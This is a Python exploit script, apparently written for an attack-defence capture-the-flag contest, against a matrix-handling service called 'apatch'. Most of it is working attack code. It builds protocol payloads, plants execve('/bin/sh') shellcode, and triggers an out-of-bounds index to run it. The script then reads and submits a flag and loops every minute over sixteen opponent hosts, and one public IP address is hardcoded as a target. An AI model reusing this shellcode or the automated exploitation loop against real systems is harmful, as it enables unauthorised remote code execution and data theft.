from threading import Thread
from time import sleep

from libad import *
from zio import *

target = ('119.254.101.197', 10000)
target = './apatch'
#target = ('10.0.17.1',9999)

def interact(io):
    def run_recv():
        while True:
            try:
                output = io.read_until_timeout(timeout=1)
                # print output
            except:
                return

    t1 = Thread(target=run_recv)
    t1.start()
    while True:
        d = raw_input()
        if d != '':
            io.writeline(d)


def add(io, hang,lie, buf):
    payload = l32(0xdeadfafa)+l8(0)
    payload += l32(hang)+l32(lie)+l32(len(buf))
    payload += buf
    io.write(payload)
    d = io.read(1)
    assert  ord(d) == 0xcc
    index = l32(io.read(4))
    print hex(index)

def show(io, index):
    payload = l32(0xdeadfafa)+l8(1)+l32(index)
    io.write(payload)
    d = io.read(1)
    print hex(ord(d))
    assert  ord(d) == 0xcc
    hang = l32(io.read(4))
    lie = l32(io.read(4))
    print 'hang:', hex(hang)
    print 'lie:', hex(lie)
    return hang, lie

def delete(io, index):
    payload = l32(0xdeadfafa)+l8(2)+l32(index)
    io.write(payload)
    d = io.read(1)
    assert ord(d) == 0xcc

def show_row(io, index, row):
    payload = l32(0xdeadfafa)+l8(3)+l32(index)+l32(row)
    io.write(payload)
    d = io.read(1)
    print hex(ord(d))
    assert ord(d) == 0xcc
    len = l32(io.read(4))
    print 'len:', hex(len)
    buf = io.read(len)
    #print 'buf:', buf.encode('hex')
    return buf

def add_row(io, index, row1, row2):
    payload = l32(0xdeadfafa)+l8(4)+l32(index)+l32(row1)+l32(row2)
    io.write(payload)
    d = io.read(1)
    print hex(ord(d))
    assert ord(d) == 0xcc

def mul_row(io, index, row, val):
    payload = l32(0xdeadfafa)+l8(5)+l32(index)+l32(row)+l32(val)
    io.write(payload)
    d = io.read(1)
    print hex(ord(d))
    assert ord(d) == 0xcc

def matrix_add(io, index1, index2):
    payload = l32(0xdeadfafa)+l8(6)+l32(index1)+l32(index2)
    io.write(payload)
    d = io.read(1)
    print hex(ord(d))
    assert ord(d) == 0xcc

def matrix_mul(io, index1, index2):
    payload = l32(0xdeadfafa)+l8(7)+l32(index1)+l32(index2)
    io.write(payload)
    d = io.read(1)
    print hex(ord(d))
    assert ord(d) == 0xcc

def expand(io, index, row, buf):
    payload = l32(0xdeadfafa)+l8(8)+l32(index)+l32(row)+buf
    io.write(payload)
    d = io.read(1)
    print hex(ord(d))
    assert ord(d) == 0xcc

def exp3(target):
    io = zio(target, timeout=30, print_read=COLORED(RAW, 'red'), \
             print_write=COLORED(RAW, 'green'))
    payload = 'hri\x01\x01\x814$\x01\x01\x01\x011\xd2Rj\x08ZH\x01\xe2RH\x89\xe2jhH\xb8/bin///sPj;XH\x89\xe7H\x89\xd6\x99\x0f\x05'
    add(io, 0x3eeb, 1, payload)
    index = (0x2030a0 - 0x203020)/8
    payload = l32(0xdeadfafa) + l8(index)
    io.write(payload)
    io.writeline('./bin/cat flag/flag')
    flag = io.readline()[:-1].strip()
    print target
    print 'flag', flag
    submit_flag(flag)
    io.close()
    #interact(io)

ips = []
for i in range(1, 17):
    ips.append(  '172.16.'+ str(i)+'.102')

while True:
    for ip in ips:
        try:
            target = (ip, 20002)
            print target
            exp3(target)
        except:
            pass
    sleep(60)
